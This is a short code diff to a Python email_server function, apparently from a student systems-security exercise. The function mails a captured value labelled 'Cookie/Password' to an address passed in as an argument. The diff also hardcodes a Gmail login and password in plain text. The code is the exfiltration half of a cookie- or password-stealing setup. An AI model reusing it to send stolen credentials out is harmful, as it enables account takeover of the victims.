@@ -19,7 +19,7 @@ def email_server():
       sender_email = "ijustwanttograduatefromsutd@gmail.com" 
       receiver_email = arg1 
       password = "iluvsyssec"
-      message = 'Subject: {}\n\n{}'.format("Cookie omnomnom", "Cookie: " + arg2)
+      message = 'Subject: {}\n\n{}'.format("The good stuff", "Cookie/Password: " + arg2)
       
       context = ssl.create_default_context()
       with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
